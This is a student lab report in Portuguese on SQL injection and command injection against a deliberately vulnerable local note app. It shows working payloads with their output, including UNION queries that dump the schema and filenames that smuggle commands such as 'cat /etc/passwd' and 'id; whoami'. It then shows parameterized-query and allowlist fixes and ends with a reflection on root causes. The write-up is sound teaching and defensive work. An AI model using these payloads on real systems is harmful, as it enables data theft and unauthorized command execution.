# Lab 10

Laboratório de Injeção SQL e de Comandos

### Exercício 1: Reconhecimento de SQL _injection_

_Payload_: `' OR '1'='1`:

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' OR '1'='1
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' OR '1'='1%'
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

Este ataque altera a lógica da cláusula `WHERE` para que a condição seja sempre verdadeira. Colocar `'` no inicio do _payload_ fecha a `'` da consulta original. O `OR '1'='1` adiciona uma condição que é sempre verdadeira. Isto faz com que o filtro de pesquisa seja ignorado, retornando todos os registos da tabela.

_Payload_: `' UNION SELECT 1, sql, '' FROM sqlite_master --`:

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' UNION SELECT 1, sql, '' FROM sqlite_master --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' UNION SELECT 1, sql, '' FROM sqlite_master --%'
  [1] CREATE TABLE notes (id INTEGER PRIMARY KEY, title TEXT, body TEXT):
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

Este ataque utiliza o operador `UNION` para anexar resultados de uma tabela do sistema. `sqlite_master` é uma tabela interna que armazena a estrutura da base de dados. o campo `sql` contém o comando `CREATE TABLE`. Os caracteres `--` comentam o resto da query para evitar erros de sintaxe. Através deste _payload_ o atacante é capaz de descobrir a estrutura exata das tabelas.

_Payload_: `' UNION SELECT 1, title, body FROM notes --`

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' UNION SELECT 1, title, body FROM notes --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' UNION SELECT 1, title, body FROM notes --%'
  [1] Reminder: Submit the SSI lab report on time.
  [1] Secret: The admin password is hunter2.
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

Este ataque é semelhante ao anterior, mas tem o intuito de extrair dados especificos. Este ataque tem a capacidade de extrair dados de outras tabelas (bastava mudar `notes` no _payload_ para outra tabela).

### Exercício 2: _Command injection_

Nome do ficheiro: `note.txt`

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: note.txt
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt
  Note exported to note.txt
```

O comportamento foi o esperado e não houve exploração de informação.

Nome do ficheiro: `note.txt; cat /etc/passwd`

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 2
  Enter filename to export to: note.txt; cat /etc/passwd
[DEBUG] Executing command: echo 'Title: Reminder
Body: Submit the SSI lab report on time.' > note.txt; cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
eduardo:x:1000:1000:eduardo:/home/eduardo:/usr/bin/zsh
  Note exported to note.txt; cat /etc/passwd
```

O `;` serve como separador de comandos na shell. A shell executou o `echo` e de seguida executou `cat /etc/passwd`. Através deste ataque o atacante é capaz de visualizar todos os utilizadores do sistema.

Nome do ficheiro: `note.txt; id; whoami`

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 3
  Enter filename to export to: note.txt; id; whoami
[DEBUG] Executing command: echo 'Title: Secret
Body: The admin password is hunter2.' > note.txt; id; whoami
uid=1000(eduardo) gid=1000(eduardo) groups=1000(eduardo),...,27(sudo),30(dip),100(users)
eduardo
  Note exported to note.txt; id; whoami
```

Mais uma vez, este ataque utiliza `;` que permite encadear comandos na shell. Os comandos `id` e `whoami` permitem ao atacante saber com que privilégios está o programa a ser executado.

Nome do ficheiro: `ls -la`

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: `ls -la`
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > `ls -la`
sh: 1: cannot create total 28
drwxrwxr-x 2 eduardo eduardo 4096 May  4 10:43 .
drwxrwxr-x 3 eduardo eduardo 4096 Apr 27 13:16 ..
-rw-r--r-- 1 eduardo eduardo 2592 May  4 10:00 noteapp.py
-rw-r--r-- 1 eduardo eduardo 8192 May  4 10:02 notes.db
-rw-rw-r-- 1 eduardo eduardo   51 May  4 10:44 note.txt
-rw-rw-r-- 1 eduardo eduardo 2650 May  4 10:43 S12.md: File name too long
  Note exported to `ls -la`
```

Os caracteres ``` permitem efetuar substituição de comandos na shell. A shell executa o comando dentro dos _backticks_ primeiro e usa o seu resultado no comando principal. Através deste mecanismo o atacante é capaz de conhecer o conteúdo da pasta ou de outros locais.

A vulnerabilidade situa-se na função `export_note`. O programa utiliza a função `os.system()`, que envia uma string diretamente para a shell do sistema operativo. Como o nome do ficheiro fornecido pelo utilizador é inserido diretamente na string do comando sem qualquer validação, a shell interpreta caracteres especiais (como ; ou `) como instruções de controlo.

Num cenário real, um atacante poderia ler ficheiros sensíveis (configurações, chaves SSH, ...), obter controlo remoto, apagar ficheiros e até usar o servidor para realizar outros ataques.

### Exercício 3: Remediação segura (SQL _injection_)

A correção situa-se no ficheiro [noteapp.py](noteapp.py).

Demonstração dos _payloads_:

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' OR '1'='1
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ? with parameter: %' OR '1'='1%
  No notes found.

=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' UNION SELECT 1, sql, '' FROM sqlite_master --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ? with parameter: %' UNION SELECT 1, sql, '' FROM sqlite_master --%
  No notes found.

=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' UNION SELECT 1, title, body, FROM notes --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE ? with parameter: %' UNION SELECT 1, title, body, FROM notes --%
  No notes found.
```

### Exercício 4: Remediação segura (_command injection_)

A correção situa-se no ficheiro [noteapp.py](noteapp.py).

Demonstração dos _payloads_:

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: note.txt
  Note exported to note.txt

=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: note.txt; cat /etc/passwd
  Invalid filename. Use only alphanumeric characters, dots, or underscores.

=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: note.txt; id; whoami
  Invalid filename. Use only alphanumeric characters, dots, or underscores.

=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: `ls -la`
  Invalid filename. Use only alphanumeric characters, dots, or underscores.
```

### Exercício 5: Reflexão

A causa raiz que une vulnerabilidades tão distintas como _buffer overflows_, _format strings_ e injeções (SQL e de comandos) é a falha fundamental na distinção entre dados fornecidos pelo utilizador e instruções de controlo do programa. Em todos estes casos, o sistema processa _inputs_ externos num contexto onde estes podem alterar o fluxo de execução ou a lógica pretendida, seja ao transbordar um limite de memória para rescritura de endereços de retorno, seja ao introduzir caracteres que redefinem uma consulta ou um comando de sistema.

Embora a validação de entradas seja uma camada defensiva importante, esta revela-se insuficiente por si só devido à complexidade de prever todos os padrões de ataque e à dificuldade em higienizar dados sem comprometer a sua utilidade. Uma estratégia baseada apenas em listas negras é inerentemente reativa e sujeita a falhas de contorno. Em contraste, os princípios da parametrização e do privilégio mínimo oferecem uma defesa estrutural. A parametrização, aplicada nas injeções de SQL, assegura a separação semântica entre código e dados a nível de protocolo, enquanto o privilégio mínimo garante que, mesmo perante uma exploração bem-sucedida, o impacto seja contido pelo acesso restrito do processo ao sistema operativo.

Relativamente à corrupção de memória, o _buffer overflow_ e a vulnerabilidade de _format string_ diferem significativamente no mecanismo de interação com a _stack_. No _buffer overflow_, a exploração é sequencial e baseia-se na contiguidade da memória, o atacante escreve além do limite de um _buffer_ para corromper dados adjacentes, tipicamente o _frame pointer_ ou o _return address_. Já nas _format strings_, o ataque é posicional e não requer necessariamente um transbordo físico. O atacante utiliza especificadores de formato (como `%x` ou `%p`) para instruir a função de saída a interpretar valores da _stack_ como argumentos, permitindo tanto a leitura arbitrária de locais distantes na memória como a escrita de valores em endereços específicos.
